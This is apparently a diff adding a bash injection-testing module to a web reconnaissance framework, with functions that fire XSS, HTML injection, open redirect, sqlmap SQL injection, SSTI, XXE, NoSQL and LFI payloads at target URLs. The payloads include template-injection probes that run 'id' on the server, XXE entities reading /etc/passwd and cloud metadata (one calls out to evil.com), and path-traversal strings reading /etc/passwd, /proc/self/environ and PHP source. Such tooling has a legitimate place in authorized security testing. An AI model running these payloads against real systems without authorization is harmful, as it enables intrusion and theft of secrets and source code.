@@ -1,0 +1,560 @@
+# ============================================================
+# Recon Framework - Injection Testing Module
+# ============================================================
+
+xss_test() {
+    local target="$1"
+    local output_dir="$2"
+    local xss_dir="$output_dir/xss"
+
+    mkdir -p "$xss_dir"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    [[ -s "$param_urls" ]] || return
+
+    # ─── Reflected XSS (lightweight sampling) ─────────────────
+    log_info "Testing reflected XSS..."
+    local reflected_xss="$xss_dir/reflected_xss.txt"
+    : > "$reflected_xss"
+
+    local xss_probe="<svg/onload=alert(document.domain)>"
+
+    head -30 "$param_urls" | while read -r url; do
+        [[ -z "$url" ]] && continue
+        local base="${url%%\?*}"
+        local query="${url#*\?}"
+        IFS='&' read -ra pairs <<< "$query"
+
+        for i in "${!pairs[@]}"; do
+            local key="${pairs[$i]%%=*}"
+            [[ -z "$key" ]] && continue
+            local new_pairs=()
+            for j in "${!pairs[@]}"; do
+                [[ "$j" == "$i" ]] && new_pairs+=("${key}=${xss_probe}") || new_pairs+=("${pairs[$j]}")
+            done
+            local test_url="${base}?$(IFS='&'; echo "${new_pairs[*]}")"
+            local resp
+            resp=$(curl -sk --max-time 8 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null)
+            if echo "$resp" | grep -qi "<svg/onload=alert"; then
+                echo "[REFLECTED XSS] param=$key -> $test_url" >> "$reflected_xss"
+                log_vuln "Reflected XSS via param '$key'"
+            fi
+        done
+    done
+
+    # ─── dalfox for deep XSS ──────────────────────────────────
+    if check_tool dalfox; then
+        log_info "Running dalfox deep XSS scan..."
+        local dalfox_out="$xss_dir/dalfox_xss.txt"
+        local dalfox_budget=120
+        local dalfox_maxurls=50
+
+        case "${SCAN_MODE}" in
+            full)    dalfox_budget=180; dalfox_maxurls=100 ;;
+            stealth) dalfox_budget=60;  dalfox_maxurls=30 ;;
+        esac
+
+        local dalfox_targets="$xss_dir/dalfox_targets.txt"
+        head -"$dalfox_maxurls" "$param_urls" > "$dalfox_targets"
+
+        timeout 120 dalfox file "$dalfox_targets" \
+            --skip-bav --worker 10 --timeout 10 --delay 0 --silence \
+            ${DALFOX_AUTH[@]+"${DALFOX_AUTH[@]}"} \
+            --output "$dalfox_out" 2>/dev/null || true
+
+        local xss_hits
+        xss_hits=$(safe_count "$dalfox_out" "WEAK|VULN|POC")
+        [[ "$xss_hits" -gt 0 ]] && log_vuln "dalfox XSS findings: $xss_hits"
+    fi
+}
+
+html_injection() {
+    local target="$1"
+    local output_dir="$2"
+    local injection_dir="$output_dir/injection"
+
+    mkdir -p "$injection_dir"
+
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    [[ -s "$param_urls" ]] || return
+
+    log_info "Testing HTML injection..."
+    local htmli_file="$injection_dir/htmli.txt"
+    : > "$htmli_file"
+
+    local html_payload='<img src=x onerror=alert(1)><h1>XSSINJECTED</h1>'
+
+    grep -iE '[?&](name|title|comment|message|desc|description|body|content|text|q|search)=' \
+        "$param_urls" 2>/dev/null | head -20 | while read -r url; do
+        [[ -z "$url" ]] && continue
+        local base="${url%%\?*}"
+        local query="${url#*\?}"
+        IFS='&' read -ra pairs <<< "$query"
+
+        for i in "${!pairs[@]}"; do
+            local key="${pairs[$i]%%=*}"
+            [[ -z "$key" ]] && continue
+            local new_pairs=()
+            for j in "${!pairs[@]}"; do
+                [[ "$j" == "$i" ]] && new_pairs+=("${key}=${html_payload}") || new_pairs+=("${pairs[$j]}")
+            done
+            local test_url="${base}?$(IFS='&'; echo "${new_pairs[*]}")"
+            local resp
+            resp=$(curl -sk --max-time 8 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null)
+            if echo "$resp" | grep -qiE "onerror.*alert|XSSINJECTED"; then
+                echo "[HTML INJECTION] param=$key -> $test_url" >> "$htmli_file"
+                log_vuln "HTML injection via param '$key'"
+            fi
+        done
+    done
+}
+
+open_redirect() {
+    local target="$1"
+    local output_dir="$2"
+    local logic_dir="$output_dir/logic"
+
+    mkdir -p "$logic_dir"
+
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    [[ -s "$param_urls" ]] || return
+
+    local or_file="$logic_dir/open_redirect.txt"
+    : > "$or_file"
+
+    local canary="example.com"
+    local redirect_keys="redirect|redirect_to|url|next|dest|destination|return|returnurl|return_to|continue|goto|rurl|target|redir|r|u"
+
+    log_info "Testing open redirect..."
+    local redirect_count=0
+
+    grep -iE "[?&](${redirect_keys})=" "$param_urls" 2>/dev/null | head -5 > "$or_file.tmp"
+    while read -r url; do
+        [[ -z "$url" ]] && continue
+        local base="${url%%\?*}"
+        local query="${url#*\?}"
+        IFS='&' read -ra pairs <<< "$query"
+
+        for i in "${!pairs[@]}"; do
+            local key="${pairs[$i]%%=*}"
+            [[ -z "$key" ]] && continue
+            local new_pairs=()
+            for j in "${!pairs[@]}"; do
+                [[ "$j" == "$i" ]] && new_pairs+=("${key}=https://${canary}/") || new_pairs+=("${pairs[$j]}")
+            done
+            local test_url="${base}?$(IFS='&'; echo "${new_pairs[*]}")"
+            local loc
+            loc=$(curl -sk -o /dev/null -D - --max-redirs 0 --max-time 6 \
+                ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null | grep -i '^location:' | head -1 | tr -d '\r')
+            if echo "$loc" | grep -qiE "https?://(www\.)?${canary}|^location:[[:space:]]*//${canary}"; then
+                echo "[OPEN REDIRECT] param=$key -> $test_url ($loc)" >> "$or_file"
+                log_vuln "Open redirect via param '$key'"
+                ((redirect_count++))
+            fi
+        done
+    done < "$or_file.tmp"
+    rm -f "$or_file.tmp"
+
+    log_ok "Open redirect: $(safe_count "$or_file") found"
+}
+
+# SQLi via sqlmap
+sqli_test() {
+    local target="$1"
+    local output_dir="$2"
+    local injection_dir="$output_dir/injection"
+    local sqlmap_targets="$injection_dir/sqlmap_targets.txt"
+
+    mkdir -p "$injection_dir"
+
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    : > "$sqlmap_targets"
+
+    # Collect targets from various sources
+    [[ -s "$param_urls" ]] && grep -E '\?[^=]+=' "$param_urls" >> "$sqlmap_targets" 2>/dev/null || true
+    [[ -f "$injection_dir/arjun_hidden_params.txt" ]] && cat "$injection_dir/arjun_hidden_params.txt" >> "$sqlmap_targets" 2>/dev/null || true
+
+    sort -u "$sqlmap_targets" -o "$sqlmap_targets"
+
+    local target_count
+    target_count=$(safe_count "$sqlmap_targets")
+
+    if [[ "$target_count" -eq 0 ]]; then
+        log_warn "No parameterised URLs for SQLi testing"
+        return
+    fi
+
+    check_tool sqlmap || { log_warn "sqlmap not found"; return; }
+
+    log_info "Running sqlmap on $target_count targets..."
+
+    local level=2
+    local risk=1
+    case "${SCAN_MODE}" in
+        full)    level=3; risk=2 ;;
+        stealth) level=1; risk=1 ;;
+    esac
+
+    timeout 30 sqlmap -m "$sqlmap_targets" --batch --random-agent --smart \
+        --level "$level" --risk "$risk" --threads 4 \
+        ${SQLMAP_AUTH[@]+"${SQLMAP_AUTH[@]}"} \
+        --output-dir="$injection_dir/sqlmap_out" 2>/dev/null | tee "$injection_dir/sqlmap_log.txt" \
+        | grep -iE "is vulnerable|parameter .* appears|back-end DBMS|injectable" | head -5 || true
+
+    [[ -f "$injection_dir/sqlmap_log.txt" ]] && \
+        grep -qiE "is vulnerable|injectable" "$injection_dir/sqlmap_log.txt" 2>/dev/null && \
+        log_vuln "SQLi indications found - review $injection_dir/sqlmap_out/"
+}
+# ─── SSTI (Server-Side Template Injection) ─────────────────────
+# ─── SSTI (Server-Side Template Injection) ─────────────────────
+# Fixed: payload array no longer crashes the shell (was: double-quoted
+#        "${7*7}" -> bash "bad substitution" -> whole script aborted at step 41).
+# Hardened: detection is now differential/evidence-based to avoid the previous
+#           grep -qE '49|14|50|id|uid=|root:' which matched almost every page.
+ssti_check() {
+    local target="$1"
+    local output_dir="$2"
+    local ssti_dir="$output_dir/ssti"
+    mkdir -p "$ssti_dir"
+
+    log_info "Testing SSTI (Server-Side Template Injection)..."
+
+    local ssti_file="$ssti_dir/ssti.txt"
+    : > "$ssti_file"
+
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    [[ -s "$param_urls" ]] || { log_ok "No parameterised URLs for SSTI"; return; }
+
+    # Distinctive operands: a coincidental match of the product in normal page
+    # content is extremely unlikely (8-digit number), which is what kills FPs.
+    local m1=9999 m2=9999
+    local expect=$(( m1 * m2 ))     # 99980001
+    local raw="${m1}*${m2}"         # literal "9999*9999" — must NOT be reflected verbatim
+
+    # Arithmetic probes across common engines.
+    # ${raw} is an INTENTIONAL expansion of the pre-built literal above, so there
+    # is no "bad substitution": each element becomes e.g. {{9999*9999}}.
+    local arith_payloads=(
+        "{{${raw}}}"       # Jinja2 / Twig / Nunjucks / Jinjava
+        "\${${raw}}"       # Freemarker / Thymeleaf / Spring EL   (\$ = literal $)
+        "#{${raw}}"        # Ruby (slim/erb-ish), some JSP EL
+        "{${raw}}"         # Smarty
+        "<%= ${raw} %>"    # ERB
+        "*{${raw}}"        # Thymeleaf selection
+    )
+
+    # RCE confirmation probes. No arithmetic — matched only by distinctive command
+    # output ("uid=" from id, or an /etc/passwd root line). Single '$' escaped.
+    local rce_payloads=(
+        "{{self.__class__.__mro__[1].__subclasses__()}}"
+        "\${T(java.lang.Runtime).getRuntime().exec('id')}"
+        "<%= system('id') %>"
+        "{php}echo system('id');{/php}"
+    )
+
+    grep -iE '[?&](template|tpl|view|render|page|content|name|message|body|text|q|search)=' \
+        "$param_urls" 2>/dev/null | head -5 > "$ssti_dir/targets.txt"
+
+    local url
+    while read -r url; do
+        [[ -z "$url" ]] && continue
+        local base="${url%%\?*}"
+        local query="${url#*\?}"
+        IFS='&' read -ra pairs <<< "$query"
+
+        local i
+        for i in "${!pairs[@]}"; do
+            local key="${pairs[$i]%%=*}"
+            [[ -z "$key" ]] && continue
+
+            # ---- Baseline: benign unique marker in this param ----
+            local benign="ZZ${RANDOM}${RANDOM}ZZ"
+            local b_pairs=()
+            local j
+            for j in "${!pairs[@]}"; do
+                [[ "$j" == "$i" ]] && b_pairs+=("${key}=${benign}") || b_pairs+=("${pairs[$j]}")
+            done
+            local base_url_test="${base}?$(IFS='&'; echo "${b_pairs[*]}")"
+            local base_resp
+            base_resp=$(curl -skg --max-time 8 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$base_url_test" 2>/dev/null)
+
+            # If the expected product already exists on the page, this param can't
+            # give a trustworthy signal -> skip to avoid a false positive.
+            echo "$base_resp" | grep -qF "$expect" && continue
+
+            # ---- Arithmetic probes (evaluation => product appears, raw does NOT) ----
+            local hit=0
+            local payload
+            for payload in "${arith_payloads[@]}"; do
+                local new_pairs=()
+                for j in "${!pairs[@]}"; do
+                    [[ "$j" == "$i" ]] && new_pairs+=("${key}=${payload}") || new_pairs+=("${pairs[$j]}")
+                done
+                local test_url="${base}?$(IFS='&'; echo "${new_pairs[*]}")"
+                local resp
+                resp=$(curl -skg --max-time 6 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null)
+
+                # CONFIRMED only if the computed product is present AND the literal
+                # expression is not simply reflected back unrendered.
+                if echo "$resp" | grep -qF "$expect" && ! echo "$resp" | grep -qF "$raw"; then
+                    echo "[SSTI-CONFIRMED] param=$key payload=\"$payload\" evidence=${expect} -> $test_url" >> "$ssti_file"
+                    record_finding "ssti" "high" "CONFIRMED" "$test_url" "evaluated ${raw}=${expect} via param $key"
+                    hit=1
+                    break
+                fi
+            done
+            [[ "$hit" -eq 1 ]] && break   # one confirmed param per URL is enough
+
+            # ---- RCE probes (only distinctive command output counts) ----
+            for payload in "${rce_payloads[@]}"; do
+                local new_pairs=()
+                for j in "${!pairs[@]}"; do
+                    [[ "$j" == "$i" ]] && new_pairs+=("${key}=${payload}") || new_pairs+=("${pairs[$j]}")
+                done
+                local test_url="${base}?$(IFS='&'; echo "${new_pairs[*]}")"
+                local resp
+                resp=$(curl -skg --max-time 6 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null)
+
+                if echo "$resp" | grep -qE 'uid=[0-9]+\([a-z]+\).*gid=[0-9]+|root:.*:0:0:'; then
+                    echo "[SSTI-RCE] param=$key payload=\"$payload\" -> $test_url" >> "$ssti_file"
+                    record_finding "ssti_rce" "critical" "CONFIRMED" "$test_url" "command output via param $key"
+                    hit=1
+                    break
+                fi
+            done
+            [[ "$hit" -eq 1 ]] && break
+        done
+    done < "$ssti_dir/targets.txt"
+
+    local ssti_hits
+    ssti_hits=$(safe_count "$ssti_file")
+    [[ "$ssti_hits" -gt 0 ]] && log_vuln "SSTI findings: $ssti_hits" || log_ok "No SSTI detected"
+
+    # ─── tplmap engine detection (optional, bounded) ───────────────
+    if check_tool sstimap || check_tool tplmap; then
+        log_info "Running SSTImap/tplmap for deep SSTI analysis (limited)..."
+        local tplmap_out="$ssti_dir/tplmap_results.txt"
+        : > "$tplmap_out"
+        [[ -s "$ssti_dir/targets.txt" ]] || return
+
+        local _ssti_bin; _ssti_bin=$(command -v sstimap || command -v tplmap)
+        head -3 "$ssti_dir/targets.txt" | while read -r url; do
+            [[ -z "$url" ]] && continue
+            local query="${url#*\?}"
+            IFS='&' read -ra pairs <<< "$query"
+            for i in "${!pairs[@]}"; do
+                local key="${pairs[$i]%%=*}"
+                [[ -z "$key" ]] && continue
+                timeout 30 "$_ssti_bin" -u "${url}" -p "$key" \
+                    --level 1 -v 0 2>/dev/null | \
+                    grep -E "VULNERABLE|Engine|SSTIBased|identified" >> "$tplmap_out" || true
+            done
+        done
+
+        grep -qE "VULNERABLE|Engine" "$tplmap_out" 2>/dev/null && \
+            log_vuln "tplmap confirmed SSTI - see $tplmap_out"
+    elif [[ "$ssti_hits" -gt 0 ]]; then
+        log_info "Install tplmap for engine detection: pipx install sstimap (maintained tplmap successor)"
+    fi
+}
+
+# ─── XXE (XML External Entity) Injection ───────────────────────
+xxe_check() {
+    local target="$1"
+    local output_dir="$2"
+    local xxe_dir="$output_dir/xxe"
+    mkdir -p "$xxe_dir"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Testing XXE (XML External Entity)..."
+
+    local xxe_file="$xxe_dir/xxe.txt"
+    : > "$xxe_file"
+
+    # XXE payloads
+    local xxe_payloads=(
+        # Basic file read
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+        # Windows
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
+        # SSRF via XXE
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'
+        # OOB XXE (requires interactsh)
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo>&exfil;</foo>'
+    )
+
+    local endpoints_file="$output_dir/endpoints/all_endpoints.txt"
+    [[ -f "$endpoints_file" ]] || return
+
+    # Find XML endpoints - limit to 5
+    grep -iE '/(api|xml|soap|import|upload|parser)' "$endpoints_file" 2>/dev/null | head -5 > "$xxe_dir/xml_endpoints.txt"
+
+    while read -r endpoint; do
+        [[ -z "$endpoint" ]] && continue
+
+        # Only test first 3 payloads
+        local count=0
+        for payload in "${xxe_payloads[@]}"; do
+            [[ $count -ge 3 ]] && break
+            local resp
+            resp=$(curl -sk --max-time 5 -X POST -H "Content-Type: application/xml" \
+                -d "$payload" ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$endpoint" 2>/dev/null)
+
+            if echo "$resp" | grep -qE 'root:|daemon:|bin:|sys:|\[extensions\]|meta-data|ami-id'; then
+                echo "[XXE] $endpoint -> $payload" >> "$xxe_file"
+                log_vuln "XXE vulnerability: $endpoint"
+                break
+            fi
+            ((count++))
+        done
+    done < "$xxe_dir/xml_endpoints.txt"
+
+    local xxe_hits
+    xxe_hits=$(safe_count "$xxe_file")
+    [[ "$xxe_hits" -gt 0 ]] && log_vuln "XXE findings: $xxe_hits" || log_ok "No XXE detected"
+}
+
+# ─── NoSQL Injection ───────────────────────────────────────────
+nosql_injection_check() {
+    local target="$1"
+    local output_dir="$2"
+    local nosql_dir="$output_dir/nosql"
+    mkdir -p "$nosql_dir"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Testing NoSQL Injection..."
+
+    local nosql_file="$nosql_dir/nosql.txt"
+    : > "$nosql_file"
+
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    [[ -s "$param_urls" ]] || return
+
+    # NoSQL payloads (MongoDB)
+    local nosql_payloads=(
+        '{"$ne":null}'
+        '{"$gt":""}'
+        '{"$regex":".*"}'
+        '{"$where":"1==1"}'
+        '{"$or":[{"a":"a"},{"b":"b"}]}'
+    )
+
+    grep -iE '[?&](id|user|username|email|query|filter|search|data)=' "$param_urls" 2>/dev/null | head -5 > "$nosql_dir/targets.txt"
+
+    while read -r url; do
+        [[ -z "$url" ]] && continue
+        local base="${url%%\?*}"
+        local query="${url#*\?}"
+        IFS='&' read -ra pairs <<< "$query"
+
+        for i in "${!pairs[@]}"; do
+            local key="${pairs[$i]%%=*}"
+            [[ -z "$key" ]] && continue
+
+            # Only test first 3 payloads
+            local count=0
+            for payload in "${nosql_payloads[@]}"; do
+                [[ $count -ge 3 ]] && break
+                local new_pairs=()
+                for j in "${!pairs[@]}"; do
+                    [[ "$j" == "$i" ]] && new_pairs+=("${key}=${payload}") || new_pairs+=("${pairs[$j]}")
+                done
+                local test_url="${base}?$(IFS='&'; echo "${new_pairs[*]}")"
+                local resp
+                resp=$(curl -sk --max-time 5 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null)
+
+                # Check for increased data return or error
+                if echo "$resp" | grep -qiE 'mongodb|bson|syntax error|unexpected|near.*\$'; then
+                    echo "[NOSQL] param=$key payload=$payload -> $test_url" >> "$nosql_file"
+                    log_vuln "Possible NoSQL injection via param '$key'"
+                    break 2
+                fi
+            done
+        done
+    done < "$nosql_dir/targets.txt"
+
+    local nosql_hits
+    nosql_hits=$(safe_count "$nosql_file")
+    [[ "$nosql_hits" -gt 0 ]] && log_vuln "NoSQL injection findings: $nosql_hits" || log_ok "No NoSQL injection detected"
+}
+
+
+# ── LFI / Path Traversal (P1: file read -> source/secret disclosure -> RCE) ──
+# Confirmation is signature-based with a benign baseline => near-zero false positives.
+lfi_path_traversal_check() {
+    local target="$1" output_dir="$2"
+    local lfi_dir="$output_dir/lfi"; mkdir -p "$lfi_dir"
+    local lfi_file="$lfi_dir/lfi_findings.txt"; : > "$lfi_file"
+
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    [[ -s "$param_urls" ]] || { log_ok "No parameterised URLs for LFI"; return; }
+
+    log_info "Testing LFI / path traversal..."
+
+    # Payloads: unix passwd, windows win.ini, proc, and php://filter source read.
+    local lfi_payloads=(
+        "../../../../../../../../etc/passwd"
+        "....//....//....//....//....//etc/passwd"
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        "/etc/passwd"
+        "..%252f..%252f..%252f..%252fetc%252fpasswd"
+        "../../../../../../windows/win.ini"
+        "..\\..\\..\\..\\windows\\win.ini"
+        "/proc/self/environ"
+        "php://filter/convert.base64-encode/resource=index.php"
+    )
+    # Signatures that only appear on genuine file read (very specific).
+    local unix_sig='root:.*:0:0:|daemon:.*:/usr/sbin'
+    local win_sig='\[fonts\]|\[extensions\]|for 16-bit app support'
+    local proc_sig='PATH=|HOME=/|SHELL=/'
+    local phpfilter_sig='PD9waHA|PHNjcmlwdA|PD9='   # base64 of "<?php", "<script", "<?="
+
+    # LFI-prone parameter names get priority, but we also test others lightly.
+    local prio='file path page doc document folder template include inc view load read download filename dir url pathname content src'
+
+    head -8 "$param_urls" | while read -r url; do
+        [[ -z "$url" ]] && continue
+        local k
+        while read -r k; do
+            [[ -z "$k" ]] && continue
+            # baseline: benign value must not already show any signature
+            local base_url_t; base_url_t=$(set_param "$url" "$k" "recon_probe_value")
+            local base_resp; base_resp=$(curl -skg --max-time 5 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$base_url_t" 2>/dev/null)
+            echo "$base_resp" | grep -qE "$unix_sig|$win_sig" && continue
+
+            # deprioritise params that never look like file inputs (still test 2 payloads)
+            local limit=9
+            echo " $prio " | grep -qiw -- "$k" || limit=2
+
+            local n=0 payload
+            for payload in "${lfi_payloads[@]}"; do
+                [[ $n -ge $limit ]] && break
+                n=$((n+1))
+                local turl; turl=$(set_param "$url" "$k" "$payload")
+                local resp; resp=$(curl -skg --max-time 5 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$turl" 2>/dev/null)
+                local hit="" sev="high"
+                if echo "$resp" | grep -qE "$unix_sig"; then hit="unix /etc/passwd read"; sev="high"
+                elif echo "$resp" | grep -qiE "$win_sig"; then hit="windows win.ini read"; sev="high"
+                elif [[ "$payload" == /proc/self/environ ]] && echo "$resp" | grep -qE "$proc_sig"; then hit="/proc/self/environ read"; sev="high"
+                elif [[ "$payload" == php://* ]] && echo "$resp" | grep -qE "$phpfilter_sig"; then hit="source disclosure via php://filter"; sev="high"
+                fi
+                if [[ -n "$hit" ]]; then
+                    echo "[LFI] param=$k payload=$payload -> $turl ($hit)" >> "$lfi_file"
+                    record_finding "lfi_path_traversal" "$sev" "CONFIRMED" "$turl" "$hit via param $k"
+                    break
+                fi
+                throttle
+            done
+        done < <(param_keys "$url")
+    done
+
+    local hits; hits=$(safe_count "$lfi_file")
+    [[ "$hits" -gt 0 ]] || log_ok "No LFI / path traversal detected"
+}
